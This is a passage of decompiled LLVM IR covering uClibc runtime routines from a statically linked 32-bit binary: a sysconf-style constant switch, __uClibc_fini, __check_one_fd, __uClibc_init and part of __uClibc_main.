    i32 78, label %dec_label_pc_8053c35
    i32 79, label %dec_label_pc_8053c35
    i32 80, label %dec_label_pc_8053c35
    i32 81, label %dec_label_pc_8053c35
    i32 82, label %dec_label_pc_8053c35
    i32 83, label %dec_label_pc_8053c35
    i32 84, label %dec_label_pc_8053c35
    i32 85, label %dec_label_pc_8053d34
    i32 86, label %dec_label_pc_8053d34
    i32 87, label %dec_label_pc_8053d11
    i32 88, label %dec_label_pc_8053ca5
    i32 89, label %dec_label_pc_8053caf
    i32 90, label %dec_label_pc_8053d26
    i32 91, label %dec_label_pc_8053c35
    i32 92, label %dec_label_pc_8053c35
    i32 93, label %dec_label_pc_8053c35
    i32 94, label %dec_label_pc_8053c35
    i32 95, label %dec_label_pc_8053d0a
    i32 96, label %dec_label_pc_8053d34
    i32 97, label %dec_label_pc_8053d34
    i32 98, label %dec_label_pc_8053c35
    i32 99, label %dec_label_pc_8053c35
    i32 100, label %dec_label_pc_8053c35
    i32 101, label %dec_label_pc_8053cb9
    i32 102, label %dec_label_pc_8053cfc
    i32 103, label %dec_label_pc_8053d39
    i32 104, label %dec_label_pc_8053d11
    i32 105, label %dec_label_pc_8053cc3
    i32 106, label %dec_label_pc_8053d1f
    i32 107, label %dec_label_pc_8053d1f
    i32 108, label %dec_label_pc_8053d03
    i32 109, label %dec_label_pc_8053d40
    i32 110, label %dec_label_pc_8053d5c
    i32 111, label %dec_label_pc_8053cfc
    i32 112, label %dec_label_pc_8053d39
    i32 113, label %dec_label_pc_8053d5c
    i32 114, label %dec_label_pc_8053ccd
    i32 115, label %dec_label_pc_8053d55
    i32 116, label %dec_label_pc_8053d34
    i32 117, label %dec_label_pc_8053d34
    i32 118, label %dec_label_pc_8053cd7
    i32 119, label %dec_label_pc_8053ce1
    i32 120, label %dec_label_pc_8053d4e
    i32 121, label %dec_label_pc_8053d11
    i32 122, label %dec_label_pc_8053d11
    i32 123, label %dec_label_pc_8053d11
    i32 124, label %dec_label_pc_8053d11
    i32 125, label %dec_label_pc_8053c35
    i32 126, label %dec_label_pc_8053c35
    i32 127, label %dec_label_pc_8053d34
    i32 128, label %dec_label_pc_8053d34
    i32 129, label %dec_label_pc_8053c35
    i32 130, label %dec_label_pc_8053c35
    i32 131, label %dec_label_pc_8053d34
    i32 149, label %dec_label_pc_8053ce8
  ]

dec_label_pc_8053c35:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053c3f:                             ; preds = %entry
  %v1_8053c3f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053c44 = inttoptr i32 %v1_8053c3f to i32*
  store i32 22, i32* %v1_8053c44, align 4
  br label %dec_label_pc_8053d34

dec_label_pc_8053c4f:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053c59:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053c63:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053c6d:                             ; preds = %entry
  %v0_8053c70 = call i32 @getdtablesize()
  br label %dec_label_pc_8053c75

dec_label_pc_8053c75:                             ; preds = %entry, %dec_label_pc_8053c6d
  br label %dec_label_pc_8053d61

dec_label_pc_8053c7f:                             ; preds = %entry
  %v1_8053c82 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8053c87

dec_label_pc_8053c87:                             ; preds = %entry, %dec_label_pc_8053c7f
  br label %dec_label_pc_8053d61

dec_label_pc_8053c91:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053c9b:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053ca5:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053caf:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053cb9:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053cc3:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053ccd:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053cd7:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053ce1:                             ; preds = %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053ce8:                             ; preds = %entry
  %v5_8053cee = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8053cf6 = icmp slt i32 %v5_8053cee, 0
  %v1_8053cf8 = icmp eq i1 %v2_8053cf6, false
  br i1 %v1_8053cf8, label %dec_label_pc_8053d0a, label %dec_label_pc_8053d34

dec_label_pc_8053cfc:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d03:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d0a:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8053ce8
  br label %dec_label_pc_8053d61

dec_label_pc_8053d11:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d18:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d1f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d26:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d2d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d34:                             ; preds = %dec_label_pc_8053ce8, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8053c3f
  br label %dec_label_pc_8053d61

dec_label_pc_8053d39:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d40:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d47:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d4e:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d55:                             ; preds = %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d5c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8053d61

dec_label_pc_8053d61:                             ; preds = %dec_label_pc_8053d55, %dec_label_pc_8053d4e, %dec_label_pc_8053d47, %dec_label_pc_8053d40, %dec_label_pc_8053d39, %dec_label_pc_8053d2d, %dec_label_pc_8053d26, %dec_label_pc_8053d1f, %dec_label_pc_8053d18, %dec_label_pc_8053d11, %dec_label_pc_8053d03, %dec_label_pc_8053cfc, %dec_label_pc_8053d0a, %dec_label_pc_8053ce1, %dec_label_pc_8053cd7, %dec_label_pc_8053ccd, %dec_label_pc_8053cc3, %dec_label_pc_8053cb9, %dec_label_pc_8053caf, %dec_label_pc_8053ca5, %dec_label_pc_8053c9b, %dec_label_pc_8053c91, %dec_label_pc_8053c87, %dec_label_pc_8053c75, %dec_label_pc_8053c63, %dec_label_pc_8053c59, %dec_label_pc_8053c4f, %dec_label_pc_8053c35, %dec_label_pc_8053d34, %dec_label_pc_8053d5c
  %v0_8053d64 = phi i32 [ 255, %dec_label_pc_8053d55 ], [ 2048, %dec_label_pc_8053d4e ], [ 99, %dec_label_pc_8053d47 ], [ 20, %dec_label_pc_8053d40 ], [ -128, %dec_label_pc_8053d39 ], [ 1024, %dec_label_pc_8053d2d ], [ 4, %dec_label_pc_8053d26 ], [ 32, %dec_label_pc_8053d1f ], [ 256, %dec_label_pc_8053d18 ], [ 2147483647, %dec_label_pc_8053d11 ], [ 16, %dec_label_pc_8053d03 ], [ 127, %dec_label_pc_8053cfc ], [ 200112, %dec_label_pc_8053d0a ], [ 9, %dec_label_pc_8053ce1 ], [ 65535, %dec_label_pc_8053cd7 ], [ -32768, %dec_label_pc_8053ccd ], [ -2147483648, %dec_label_pc_8053cc3 ], [ 8, %dec_label_pc_8053cb9 ], [ 500, %dec_label_pc_8053caf ], [ 4096, %dec_label_pc_8053ca5 ], [ 16384, %dec_label_pc_8053c9b ], [ 1000, %dec_label_pc_8053c91 ], [ 32768, %dec_label_pc_8053c87 ], [ 6, %dec_label_pc_8053c75 ], [ 65536, %dec_label_pc_8053c63 ], [ 100, %dec_label_pc_8053c59 ], [ 131072, %dec_label_pc_8053c4f ], [ 1, %dec_label_pc_8053c35 ], [ -1, %dec_label_pc_8053d34 ], [ 32767, %dec_label_pc_8053d5c ]
  ret i32 %v0_8053d64

; uselistorder directives
  uselistorder i32 16384, { 1, 0 }
  uselistorder i32 (i32)* @__GI_getpagesize, { 4, 2, 1, 0, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 2, 0, 1 }
  uselistorder i32 110, { 2, 0, 1, 3 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 76, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder i32 66, { 0, 11, 9, 2, 3, 4, 12, 5, 10, 1, 6, 7, 8 }
  uselistorder i32 65, { 2, 8, 9, 10, 5, 6, 7, 4, 1, 0, 3 }
  uselistorder i32 63, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 38, { 2, 7, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 19, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8053d61, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8053d34, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8053d0a, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053c87, { 1, 0 }
  uselistorder label %dec_label_pc_8053c75, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80672a8.269 to i32)
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053d70 = load i32, i32* @ebx, align 4
  store i32 %v0_8053d70, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 2), i32 0), label %dec_label_pc_8053d84, label %dec_label_pc_8053d91

dec_label_pc_8053d84:                             ; preds = %entry, %dec_label_pc_8053d84
  %v1_8053d8b8 = phi i32 [ %v1_8053d8b, %dec_label_pc_8053d84 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8053d8b.271 to i32), i32* %stack_var_-16, align 4
  %v5_8053d84 = mul i32 %v1_8053d8b8, 4
  %v6_8053d84 = add i32 %v5_8053d84, ptrtoint (i32* @global_var_805e1c8.270 to i32)
  %v7_8053d84 = inttoptr i32 %v6_8053d84 to i32*
  %v8_8053d84 = load i32, i32* %v7_8053d84, align 4
  call void @__pseudo_call(i32 %v8_8053d84)
  %v0_8053d8b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d8b = add i32 %v0_8053d8b.pre, -1
  store i32 %v1_8053d8b, i32* %ebx.global-to-local, align 4
  %v10_8053d8c = icmp eq i32 %v0_8053d8b.pre, 0
  %v1_8053d8f = icmp eq i1 %v10_8053d8c, false
  br i1 %v1_8053d8f, label %dec_label_pc_8053d84, label %dec_label_pc_8053d91

dec_label_pc_8053d91:                             ; preds = %dec_label_pc_8053d84, %entry
  %v0_8053d91 = load i32, i32* @global_var_80672b8.272, align 8
  %v1_8053d96 = icmp eq i32 %v0_8053d91, 0
  br i1 %v1_8053d96, label %dec_label_pc_8053d9c, label %dec_label_pc_8053d9a

dec_label_pc_8053d9a:                             ; preds = %dec_label_pc_8053d91
  %v0_8053d9a = load i32, i32* %stack_var_-16, align 4
  %v1_8053d9a = call i32 @unknown_0(i32 %v0_8053d9a)
  br label %dec_label_pc_8053d9c

dec_label_pc_8053d9c:                             ; preds = %dec_label_pc_8053d9a, %dec_label_pc_8053d91
  %v0_8053d9c = load i32, i32* @global_var_80672bc.273, align 4
  %v1_8053da2 = icmp eq i32 %v0_8053d9c, 0
  br i1 %v1_8053da2, label %dec_label_pc_8053dab, label %dec_label_pc_8053da6

dec_label_pc_8053da6:                             ; preds = %dec_label_pc_8053d9c
  %v2_8053da6 = load i32, i32* %stack_var_-16, align 4
  %v1_8053da9 = call i32 @unknown_0(i32 %v2_8053da6)
  br label %dec_label_pc_8053dab

dec_label_pc_8053dab:                             ; preds = %dec_label_pc_8053da6, %dec_label_pc_8053d9c
  %v2_8053dab = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_8053dab

; uselistorder directives
  uselistorder i32 %v1_8053d8b, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d84, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_8053db2 = load i32, i32* @eax, align 4
  ret i32 %v0_8053db2
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8053db3 = load i32, i32* @esi, align 4
  %v0_8053db4 = load i32, i32* @ebx, align 4
  store i32 %v0_8053db4, i32* %stack_var_-8, align 4
  %v0_8053db8 = load i32, i32* @eax, align 4
  store i32 %v0_8053db8, i32* @esi, align 4
  %v0_8053dba = load i32, i32* @edx, align 4
  store i32 %v0_8053dba, i32* @ebx, align 4
  %v4_8053dbf = call i32 @__libc_fcntl(i32 %v0_8053db8, i32 1, i32 %tmp6)
  %v1_8053dc7 = add i32 %v4_8053dbf, 1
  %v8_8053dc7 = icmp eq i32 %v1_8053dc7, 0
  %v1_8053dc8 = icmp eq i1 %v8_8053dc7, false
  br i1 %v1_8053dc8, label %dec_label_pc_8053de3, label %dec_label_pc_8053dca

dec_label_pc_8053dca:                             ; preds = %entry
  %v0_8053dcc = load i32, i32* @ebx, align 4
  %v4_8053dd2 = trunc i32 %v0_8053dcc to i8
  %v5_8053dd2 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_805c3c0.274 to i32), i8 %v4_8053dd2, i32 %v1_8053dc7)
  %v1_8053dda = load i32, i32* @esi, align 4
  %v12_8053dda = icmp eq i32 %v5_8053dd2, %v1_8053dda
  br i1 %v12_8053dda, label %dec_label_pc_8053de3, label %dec_label_pc_8053dde

dec_label_pc_8053dde:                             ; preds = %dec_label_pc_8053dca
  %v0_8053dde = call i32 @abort()
  br label %dec_label_pc_8053de3

dec_label_pc_8053de3:                             ; preds = %dec_label_pc_8053dca, %entry, %dec_label_pc_8053dde
  %v2_8053de3 = load i32, i32* %stack_var_-12, align 4
  %v2_8053de4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053de4, i32* @ebx, align 4
  store i32 %v0_8053db3, i32* @esi, align 4
  ret i32 %v2_8053de3

; uselistorder directives
  uselistorder i32 (i32, i8, i32)* @__libc_open, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8053de3, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8053dea = load i8, i8* @global_var_80672c0.275, align 64
  %v1_8053dea = icmp eq i8 %v0_8053dea, 0
  %v1_8053df1 = icmp eq i1 %v1_8053dea, false
  br i1 %v1_8053df1, label %entry.dec_label_pc_8053e23_crit_edge, label %dec_label_pc_8053df3

entry.dec_label_pc_8053e23_crit_edge:             ; preds = %entry
  %v0_8053e26.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8053e23

dec_label_pc_8053df3:                             ; preds = %entry
  store i8 1, i8* @global_var_80672c0.275, align 64
  store i32 4096, i32* @global_var_80672b4.157, align 4
  %v0_8053e0d = call i32 @__pthread_initialize_minimal()
  %v0_8053e1e = call i32 @_stdio_init()
  br label %dec_label_pc_8053e23

dec_label_pc_8053e23:                             ; preds = %entry.dec_label_pc_8053e23_crit_edge, %dec_label_pc_8053df3
  %v0_8053e26 = phi i32 [ %v0_8053e26.pre, %entry.dec_label_pc_8053e23_crit_edge ], [ %v0_8053e1e, %dec_label_pc_8053df3 ]
  ret i32 %v0_8053e26

; uselistorder directives
  uselistorder i8* @global_var_80672c0.275, { 1, 0 }
  uselistorder label %dec_label_pc_8053e23, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_8053e27 = load i32, i32* @ebp, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80672ac.276, align 4
  store i32 %arg6, i32* @global_var_80672bc.273, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_8053e5e = mul i32 %arg2, 4
  %v3_8053e5e = add i32 %tmp31, %v2_8053e5e
  %v1_8053e61 = add i32 %v3_8053e5e, 4
  store i32 %v1_8053e61, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e61, i32* @global_var_80672b0.267, align 16
  %v3_8053e69 = load i32, i32* %arg3, align 4
  %v14_8053e69 = icmp eq i32 %v1_8053e61, %v3_8053e69
  %v1_8053e6b = icmp eq i1 %v14_8053e69, false
  br i1 %v1_8053e6b, label %dec_label_pc_8053e73, label %dec_label_pc_8053e6d

dec_label_pc_8053e6d:                             ; preds = %entry
  store i32 %v3_8053e5e, i32* @global_var_80672b0.267, align 16
  br label %dec_label_pc_8053e73

dec_label_pc_8053e73:                             ; preds = %entry, %dec_label_pc_8053e6d
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8053e78 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8053e78, i32* %eax.global-to-local, align 4
  %v3_8053e7d = bitcast i32* %stack_var_-136 to i8*
  %v4_8053e7d = call i32 @__GI_memset(i8* %v3_8053e7d, i32 0, i32 120)
  %v0_8053e82 = load i32, i32* @global_var_80672b0.267, align 16
  store i32 %v0_8053e82, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053e8a

dec_label_pc_8053e8a:                             ; preds = %dec_label_pc_8053e8a, %dec_label_pc_8053e73
  %v0_8053e8a = phi i32 [ %v1_8053e8d, %dec_label_pc_8053e8a ], [ %v0_8053e82, %dec_label_pc_8053e73 ]
  %v1_8053e8a = inttoptr i32 %v0_8053e8a to i32*
  %v2_8053e8a = load i32, i32* %v1_8053e8a, align 4
  %v3_8053e8a = icmp eq i32 %v2_8053e8a, 0
  %v1_8053e8d = add i32 %v0_8053e8a, 4
  store i32 %v1_8053e8d, i32* %eax.global-to-local, align 4
  %v1_8053e90 = icmp eq i1 %v3_8053e8a, false
  br i1 %v1_8053e90, label %dec_label_pc_8053e8a, label %dec_label_pc_8053eb1.preheader

dec_label_pc_8053eb1.preheader:                   ; preds = %dec_label_pc_8053e8a
  store i32 %v1_8053e8d, i32* @ebx, align 4
  %v1_8053eb11 = inttoptr i32 %v1_8053e8d to i32*
  %v2_8053eb12 = load i32, i32* %v1_8053eb11, align 4
  %v3_8053eb13 = icmp eq i32 %v2_8053eb12, 0
  %v1_8053eb410 = icmp eq i1 %v3_8053eb13, false
  br i1 %v1_8053eb410, label %dec_label_pc_8053e96.lr.ph, label %dec_label_pc_8053eb6

dec_label_pc_8053e96.lr.ph:                       ; preds = %dec_label_pc_8053eb1.preheader
  %v3_8053e76 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8053ea1 = add i32 %v3_8053e76, 32
  br label %dec_label_pc_8053e96

dec_label_pc_8053e96:                             ; preds = %dec_label_pc_8053e96.lr.ph, %dec_label_pc_8053eae
  %v1_8053ea1 = phi i32 [ %v2_8053eb12, %dec_label_pc_8053e96.lr.ph ], [ %v2_8053eb1, %dec_label_pc_8053eae ]
  %v0_8053ea0 = phi i32 [ %v1_8053e8d, %dec_label_pc_8053e96.lr.ph ], [ %v1_8053eae, %dec_label_pc_8053eae ]
  store i32 %v1_8053ea1, i32* %eax.global-to-local, align 4
  %v6_8053e9b = icmp ugt i32 %v1_8053ea1, 14
  br i1 %v6_8053e9b, label %dec_label_pc_8053eae, label %dec_label_pc_8053e9d

dec_label_pc_8053e9d:                             ; preds = %dec_label_pc_8053e96
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_8053ea0, i32* %stack_var_-168, align 4
  %v2_8053ea1 = mul i32 %v1_8053ea1, 8
  %v4_8053ea1 = add i32 %v3_8053ea1, %v2_8053ea1
  store i32 %v4_8053ea1, i32* %eax.global-to-local, align 4
  %v3_8053ea6 = inttoptr i32 %v4_8053ea1 to i16*
  %v4_8053ea6 = call i32 @memcpy(i16* %v3_8053ea6, i32 %v0_8053ea0, i32 8)
  store i32 %v4_8053ea6, i32* %eax.global-to-local, align 4
  %v0_8053eae.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053eae

dec_label_pc_8053eae:                             ; preds = %dec_label_pc_8053e96, %dec_label_pc_8053e9d
  %v0_8053eae = phi i32 [ %v0_8053ea0, %dec_label_pc_8053e96 ], [ %v0_8053eae.pre, %dec_label_pc_8053e9d ]
  %v1_8053eae = add i32 %v0_8053eae, 8
  store i32 %v1_8053eae, i32* @ebx, align 4
  %v1_8053eb1 = inttoptr i32 %v1_8053eae to i32*
  %v2_8053eb1 = load i32, i32* %v1_8053eb1, align 4
  %v3_8053eb1 = icmp eq i32 %v2_8053eb1, 0
  %v1_8053eb4 = icmp eq i1 %v3_8053eb1, false
  br i1 %v1_8053eb4, label %dec_label_pc_8053e96, label %dec_label_pc_8053eb6

dec_label_pc_8053eb6:                             ; preds = %dec_label_pc_8053eae, %dec_label_pc_8053eb1.preheader
  store i32 %v2_8053e78, i32* @eax, align 4
  %v0_8053eba = call i32 @_dl_aux_init()
  store i32 %v0_8053eba, i32* @eax, align 4
  %v0_8053ebf = call i32 @__GI___uClibc_init()
  %v1_8053ec8 = icmp eq i32 %tmp26, 0
  %v1_8053eca = icmp eq i1 %v1_8053ec8, false
  br i1 %v1_8053eca, label %dec_label_pc_8053ed0, label %dec_label_pc_8053ecc

dec_label_pc_8053ecc:                             ; preds = %dec_label_pc_8053eb6
  %v1_8053ecc = and i32 %tmp26, -65536
  %v2_8053ecc = or i32 %v1_8053ecc, 4096
  br label %dec_label_pc_8053ed0

dec_label_pc_8053ed0:                             ; preds = %dec_label_pc_8053eb6, %dec_label_pc_8053ecc
  %storemerge = phi i32 [ %v2_8053ecc, %dec_label_pc_8053ecc ], [ %tmp26, %dec_label_pc_8053eb6 ]
  %v0_8053ed0 = phi i32 [ %v2_8053ecc, %dec_label_pc_8053ecc ], [ %tmp26, %dec_label_pc_8053eb6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053ed0, i32* @global_var_80672b4.157, align 4
  %v13_8053ed5 = icmp eq i32 %tmp25, -1
  %v1_8053eda = icmp eq i1 %v13_8053ed5, false
  br i1 %v1_8053eda, label %dec_label_pc_8053f05, label %dec_label_pc_8053edc

dec_label_pc_8053edc:                             ; preds = %dec_label_pc_8053ed0
  %v0_8053edc = call i32 @getuid()
  store i32 %v0_8053edc, i32* %eax.global-to-local, align 4
  store i32 %v0_8053edc, i32* @ebx, align 4
  %v0_8053ee3 = call i32 @geteuid()
  store i32 %v0_8053ee3, i32* %eax.global-to-local, align 4
  %v0_8053ee8 = load i32, i32* @ebx, align 4
  %v12_8053ee8 = icmp eq i32 %v0_8053ee8, %v0_8053ee3
  %v1_8053eea = icmp eq i1 %v12_8053ee8, false
  br i1 %v1_8053eea, label %dec_label_pc_8053f1b, label %dec_label_pc_8053eec

dec_label_pc_8053eec:                             ; preds = %dec_label_pc_8053edc
  %v0_8053eec = call i32 @getgid()
  store i32 %v0_8053eec, i32* %eax.global-to-local, align 4
  store i32 %v0_8053eec, i32* @ebx, align 4
  %v0_8053ef3 = call i32 @getegid()
  store i32 %v0_8053ef3, i32* %eax.global-to-local, align 4
  %v0_8053ef8 = load i32, i32* @ebx, align 4
  %v12_8053ef8 = icmp eq i32 %v0_8053ef8, %v0_8053ef3
  %v1_8053efa = icmp eq i1 %v12_8053ef8, false
  br i1 %v1_8053efa, label %dec_label_pc_8053f1b, label %dec_label_pc_8053efc.thread

dec_label_pc_8053efc.thread:                      ; preds = %dec_label_pc_8053eec
  br label %dec_label_pc_8053f45

dec_label_pc_8053f05:                             ; preds = %dec_label_pc_8053ed0
  store i32 %tmp25, i32* %eax.global-to-local, align 4
  %v15_8053f05 = icmp eq i32 %tmp25, %tmp24
  %v1_8053f09 = icmp eq i1 %v15_8053f05, false
  br i1 %v1_8053f09, label %dec_label_pc_8053f1b, label %dec_label_pc_8053f0b

dec_label_pc_8053f0b:                             ; preds = %dec_label_pc_8053f05
  br label %dec_label_pc_8053f1b

dec_label_pc_8053f1b:                             ; preds = %dec_label_pc_8053f0b, %dec_label_pc_8053f05, %dec_label_pc_8053eec, %dec_label_pc_8053edc
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8053f22 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8053f31 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8053f40 = call i32 @__check_one_fd()
  br label %dec_label_pc_8053f45

dec_label_pc_8053f45:                             ; preds = %dec_label_pc_8053efc.thread, %dec_label_pc_8053f1b
  %storemerge53 = phi i32 [ %tmp25, %dec_label_pc_8053efc.thread ], [ %v0_8053f40, %dec_label_pc_8053f1b ]
  store i32 %storemerge53, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32* %esi.global-to-local, align 4
  %v0_8053f4a = load i32, i32* @edi, align 4
  %v1_8053f4a = inttoptr i32 %v0_8053f4a to i32*
  %v2_8053f4a = load i32, i32* %v1_8053f4a, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32* %esi.global-to-local, align 4
  store i32 %v2_8053f4a, i32* inttoptr (i32 134621720 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603208), i32 4), i32* %esi.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80672b8.272, align 8
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_805e1c8.270 to i32), i32 -134603205), i32 6), label %dec_label_pc_8053f6a, label %dec_label_pc_8053f76

dec_label_pc_8053f6a:                             ; preds = %dec_label_pc_8053f45, %dec_label_pc_8053f6a
  %v4_8053f6a51 = phi i32 [ %v1_8053f71, %dec_label_pc_8053f6a ], [ 0, %dec_label_pc_8053f45 ]
  %v5_8053f6a = mul i32 %v4_8053f6a51, 4
  %v6_8053f6a = add i32 %v5_8053f6a, ptrtoint (i32* @global_var_805e1c8.270 to i32)
  %v7_8053f6a = inttoptr i32 %v6_8053f6a to i32*
  %v8_8053f6a = load i32, i32* %v7_8053f6a, align 4
  call void @__pseudo_call(i32 %v8_8053f6a)
  %v0_8053f71 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053f71 = add i32 %v0_8053f71, 1
  store i32 %v1_8053f71, i32* %ebx.global-to-local, align 4
  %v1_8053f72.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8053f72 = icmp ult i32 %v1_8053f71, %v1_8053f72.pre
  br i1 %v7_8053f72, label %dec_label_pc_8053f6a, label %dec_label_pc_8053f76

